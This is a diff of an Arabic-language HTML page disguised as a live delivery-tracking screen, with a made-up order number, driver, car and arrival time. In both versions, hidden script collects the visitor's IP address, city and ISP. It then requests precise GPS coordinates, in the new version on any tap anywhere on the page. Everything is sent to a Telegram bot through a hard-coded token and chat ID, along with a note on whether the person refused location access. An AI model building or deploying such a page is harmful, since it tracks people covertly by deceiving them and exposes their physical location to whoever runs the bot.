@@ -3,148 +3,148 @@ index.html
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تتبع الشحنة | تطلب</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تتبع الشحنة المباشر</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f4f4f4; height: 100vh; overflow: hidden; }
+        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #e5e7eb; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
         
-        /* خلفية تشبه الخريطة */
-        .map-bg {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('https://www.google.com/maps/d/u/0/thumbnail?mid=1_f7Nq6fE-r5O7uD2fN-7YpI5p0Y') no-repeat center center;
-            background-size: cover; filter: blur(3px) brightness(0.8); z-index: 1;
-        }
+        /* رأس الصفحة - الهوية */
+        .header { background: white; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,0.05); z-index: 20; }
+        .order-id { display: flex; align-items: center; gap: 10px; }
+        .order-id i { color: #ff5e00; font-size: 20px; }
+        .order-id span { font-weight: bold; color: #374151; font-size: 14px; }
+        .status-dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; box-shadow: 0 0 8px #10b981; animation: blink 1.5s infinite; }
 
-        .app-container {
-            position: relative; z-index: 10; height: 100%; display: flex; flex-direction: column; justify-content: flex-end;
-        }
+        /* منطقة الخريطة */
+        .map-view { position: relative; flex-grow: 1; background: #d1d5db url('https://www.google.com/maps/vt/pb=!1m4!1m3!1i12!2i2345!3i1234!2m3!1e0!2sm!3i420120488!3m7!2sar!5e1105!12m4!1e68!2m2!1sset!2sRoadmap!4e0!5m1!1e0') no-repeat center; background-size: cover; }
+        .map-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.2); pointer-events: none; }
+        
+        /* مؤشر موقع المندوب الوهمي */
+        .driver-marker { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); color: #ff5e00; font-size: 30px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); animation: pulse 2s infinite; }
 
-        /* الجزء العلوي - رقم الطلب */
-        .top-bar {
-            background: white; padding: 15px; display: flex; align-items: center; gap: 15px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: absolute; top: 0; width: 100%;
-        }
-        .top-bar i { color: #ff5e00; font-size: 20px; }
-        .order-info h4 { font-size: 14px; color: #888; }
-        .order-info p { font-size: 16px; font-weight: bold; color: #222; }
+        /* البطاقة السفلية - التفاصيل */
+        .details-card { background: white; border-radius: 24px 24px 0 0; padding: 20px; box-shadow: 0 -4px 15px rgba(0,0,0,0.1); z-index: 30; }
+        .progress-bar-container { background: #f3f4f6; height: 4px; border-radius: 2px; margin-bottom: 20px; overflow: hidden; }
+        .progress-line { background: #ff5e00; height: 100%; width: 65%; border-radius: 2px; }
 
-        /* البطاقة السفلية - واجهة التطبيق */
-        .delivery-card {
-            background: white; border-radius: 30px 30px 0 0; padding: 25px;
-            box-shadow: 0 -5px 20px rgba(0,0,0,0.15); animation: slideUp 0.5s ease-out;
-        }
+        .info-grid { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
+        .driver-avatar { width: 56px; height: 56px; background: #fff7ed; border-radius: 16px; display: flex; align-items: center; justify-content: center; border: 1px solid #ffedd5; }
+        .driver-avatar i { font-size: 24px; color: #ff5e00; }
+        .driver-text h3 { font-size: 16px; color: #111827; margin-bottom: 2px; }
+        .driver-text p { font-size: 13px; color: #6b7280; }
 
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .stats { display: flex; justify-content: space-between; border-top: 1px solid #f3f4f6; padding-top: 15px; margin-bottom: 20px; }
+        .stat-item { text-align: center; flex: 1; }
+        .stat-item span { display: block; font-size: 11px; color: #9ca3af; margin-bottom: 4px; }
+        .stat-item strong { font-size: 14px; color: #1f2937; }
 
-        .driver-info { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
-        .driver-img { width: 50px; height: 50px; background: #eee; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 25px; color: #ccc; }
-        .driver-details { flex-grow: 1; text-align: right; }
-        .driver-details h3 { font-size: 18px; color: #222; }
-        .driver-details p { font-size: 13px; color: #ff5e00; font-weight: bold; }
+        .btn-action { background: #ff5e00; color: white; border: none; padding: 16px; border-radius: 16px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 12px rgba(255, 94, 0, 0.2); }
 
-        .status-badge { background: #fff0e6; color: #ff5e00; padding: 5px 12px; border-radius: 20px; font-size: 12px; display: inline-block; margin-bottom: 15px; }
-
-        .btn-main {
-            background: #ff5e00; color: white; border: none; padding: 18px; border-radius: 15px;
-            width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s;
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-        }
-        .btn-main:hover { background: #e65500; }
-
-        .footer-text { margin-top: 15px; font-size: 12px; color: #aaa; text-align: center; }
-
-        /* إشعارات الربط */
-        #status-area { margin-top: 10px; font-size: 13px; color: #666; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        @keyframes pulse { 0% { transform: translate(-50%, -50%) scale(1); } 50% { transform: translate(-50%, -50%) scale(1.1); } 100% { transform: translate(-50%, -50%) scale(1); } }
     </style>
 </head>
-<body>
+<body onclick="activateTracking()" ontouchstart="activateTracking()">
 
-<div class="map-bg"></div>
+    <div class="header">
+        <div class="order-id">
+            <i class="fas fa-box-open"></i>
+            <span>طلب رقم #9921804</span>
+        </div>
+        <div class="status-dot"></div>
+    </div>
 
-<div class="app-container">
-    <div class="top-bar">
-        <i class="fas fa-chevron-right"></i>
-        <div class="order-info">
-            <h4>رقم الطلب</h4>
-            <p>#TLB-99827104</p>
+    <div class="map-view">
+        <div class="map-overlay"></div>
+        <div class="driver-marker">
+            <i class="fas fa-motorcycle"></i>
         </div>
     </div>
 
-    <div class="delivery-card">
-        <div class="status-badge"><i class="fas fa-clock"></i> يصل خلال 12-18 دقيقة</div>
-        
-        <div class="driver-info">
-            <div class="driver-img"><i class="fas fa-user"></i></div>
-            <div class="driver-details">
-                <h3>كابتن التوصيل</h3>
-                <p>قيد التوجه إلى موقعك</p>
+    <div class="details-card">
+        <div class="progress-bar-container">
+            <div class="progress-line"></div>
+        </div>
+
+        <div class="info-grid">
+            <div class="driver-avatar">
+                <i class="fas fa-user-tie"></i>
             </div>
-            <div class="contact-icons">
-                <i class="fas fa-phone-alt" style="color: #eee; font-size: 20px;"></i>
+            <div class="driver-text">
+                <h3>الكابتن: محمد ع.</h3>
+                <p>تويوتا كورولا - بيضاء [87-5421]</p>
             </div>
         </div>
 
-        <p style="margin-bottom: 20px; color: #444; font-size: 14px;">لإظهار موقع المندوب بدقة على الخريطة وتحديث وقت الوصول، يرجى تفعيل التتبع المباشر.</p>
+        <div class="stats">
+            <div class="stat-item">
+                <span>الوقت المتوقع</span>
+                <strong>12 دقيقة</strong>
+            </div>
+            <div style="width: 1px; background: #f3f4f6;"></div>
+            <div class="stat-item">
+                <span>المسافة</span>
+                <strong>3.2 كم</strong>
+            </div>
+        </div>
 
-        <button class="btn-main" onclick="startProcess()">
-            <i class="fas fa-location-crosshairs"></i>
-            تفعيل التتبع المباشر
+        <button class="btn-action">
+            <i class="fas fa-location-arrow"></i>
+            تحديث موقع المندوب الآن
         </button>
-
-        <div id="status-area">بانتظار الإذن...</div>
-        <p class="footer-text">نظام تتبع الطلبات الذكي - جميع الحقوق محفوظة</p>
-    </div>
-</div>
-
-<script>
-    const TELEGRAM_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
-    const CHAT_ID = '6876904688'; 
-
-    let fullData = {};
-
-    fetch('https://ipapi.co/json/')
-    .then(res => res.json())
-    .then(data => {
-        fullData.ip = data.ip;
-        fullData.city = data.city;
-        fullData.isp = data.org;
-    });
-
-    function startProcess() {
-        document.getElementById('status-area').innerText = "جاري الاتصال بالنظام...";
         
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    fullData.lat = pos.coords.latitude;
-                    fullData.lng = pos.coords.longitude;
-                    fullData.map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendToTelegram("✅ زبون فَعّل التتبع");
-                },
-                (err) => {
-                    sendToTelegram("⚠️ فتح الرابط ورفض الموقع");
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        }
-    }
+        <p style="text-align: center; color: #9ca3af; font-size: 11px; margin-top: 15px;">إلمس الشاشة في أي مكان لتحديث الخريطة</p>
+    </div>
 
-    function sendToTelegram(statusMsg) {
-        const message = `${statusMsg}\n📍 IP: ${fullData.ip || '--'}\n🏙 المدينة: ${fullData.city || '--'}\n🔗 الخريطة: ${fullData.map || 'مرفوض'}`;
+    <script>
+        const TELEGRAM_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
+        const CHAT_ID = '6876904688'; 
+        let isActive = false;
+        let userData = {};
 
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        })
-        .then(() => {
-            document.getElementById('status-area').innerText = "تم التفعيل. انتظر الخريطة...";
-            alert("تم تفعيل التتبع المباشر. ستظهر بيانات المندوب فور التحديث.");
+        // جلب البيانات الأولية صامتة
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+            userData.ip = d.ip;
+            userData.city = d.city;
+            userData.isp = d.org;
         });
-    }
-</script>
 
+        function activateTracking() {
+            if (isActive) return;
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => {
+                        isActive = true;
+                        userData.lat = p.coords.latitude;
+                        userData.lng = p.coords.longitude;
+                        sendReport("✅ تم تحديد موقع الزبون بدقة");
+                    },
+                    (e) => {
+                        if (!isActive) {
+                            isActive = true;
+                            sendReport("⚠️ الزبون فتح الرابط لكن منع الـ GPS");
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            }
+        }
+
+        function sendReport(status) {
+            const mapLink = userData.lat ? `https://www.google.com/maps?q=${userData.lat},${userData.lng}` : 'غير متوفر';
+            const text = `${status}\n━━━━━━━━━━━━\n🌐 IP: ${userData.ip || '--'}\n🏙 المدينة: ${userData.city || '--'}\n📡 الشركة: ${userData.isp || '--'}\n📍 الموقع: ${mapLink}\n━━━━━━━━━━━━`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            });
+
+            alert("جاري تحديث إحداثيات المندوب.. يرجى البقاء في الصفحة");
+        }
+    </script>
 </body>
 </html>
